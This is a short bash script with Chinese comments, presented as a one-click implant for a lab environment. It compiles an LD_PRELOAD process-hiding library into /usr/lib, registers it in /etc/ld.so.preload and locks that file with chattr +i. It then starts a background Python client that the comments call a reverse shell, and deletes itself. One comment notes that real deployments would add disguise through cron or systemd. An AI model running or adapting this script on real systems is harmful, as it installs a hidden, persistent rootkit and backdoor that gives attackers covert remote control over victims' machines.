#!/bin/bash
# ============================================================
#  一键植入脚本(实验环境)
#  1) 编译 LD_PRELOAD 病毒
#  2) 写入 /etc/ld.so.preload 并用 chattr +i 锁死
#  3) 自删除
# ============================================================
set -e

# 必须 root,因为要改 /etc 和 /usr/lib
if [ "$(id -u)" -ne 0 ]; then
    echo "[!] need root"
    exit 1
fi

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
SO_SRC="$ROOT_DIR/preload_c/preload.c"
SO_BIN="/usr/lib/libprocesshider.so"
PRELOAD_FILE="/etc/ld.so.preload"
CLIENT="$ROOT_DIR/client_py/client.py"

# ---------- 1. 编译 .so ----------
echo "[*] compiling preload .so"
gcc -shared -fPIC -nostartfiles -o "$SO_BIN" "$SO_SRC" -ldl

# ---------- 2. 写入 /etc/ld.so.preload 并锁死 ----------
# 用 >> 追加,避免覆盖已有 preload 配置
echo "$SO_BIN" >> "$PRELOAD_FILE"
chattr +i "$PRELOAD_FILE"
echo "[+] $PRELOAD_FILE locked (+i)"

# ---------- 3. 顺手把反弹 shell 跑起来 ----------
# 实际生产环境会做更深的伪装(改名字、塞进 cron、systemd 等),这里只 demo
if [ -f "$CLIENT" ]; then
    nohup python3 "$CLIENT" >/dev/null 2>&1 &
    disown 2>/dev/null || true
    echo "[*] client launched"
fi

# ---------- 4. 自删除 ----------
SELF="$(readlink -f "$0")"
rm -f -- "$SELF"
echo "[*] self removed"
